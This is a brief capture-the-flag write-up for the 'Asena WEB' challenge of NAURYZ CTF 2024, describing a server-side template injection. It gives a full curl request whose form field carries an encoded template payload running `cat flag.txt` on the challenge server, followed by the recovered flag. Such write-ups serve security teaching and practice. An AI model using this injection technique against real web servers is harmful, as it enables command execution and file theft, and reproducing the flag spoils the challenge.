# NAURYZ CTF 2024 Write-up

![image](https://github.com/zer00d4y/writeups/assets/128820441/48273d52-3cc4-448c-b409-f2fcba34b0af)

## WEB

### Asena WEB

![image](https://github.com/zer00d4y/writeups/assets/128820441/2bde51ec-c7e1-4b52-b662-aaa89ebfb436)

SSTI vulnerability

    curl 'http://185.22.64.121:1337/' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://185.22.64.121:1337/' -H 'Origin: http://185.22.64.121:1337' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'sec-ch-ua-platform: "Windows"' -H 'sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"' -H 'sec-ch-ua-mobile: ?0' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw $'quantity=5\n%3C%25=%20%60cat%20flag.txt%60%20%25%3E'

![image](https://github.com/zer00d4y/writeups/assets/128820441/a045aa22-06b5-42d4-856d-0a19543a8ca1)

FLAG:

    nrzCTF{1_9RE3t_YOU_d3sCEnDAn7_OF_Asen@}
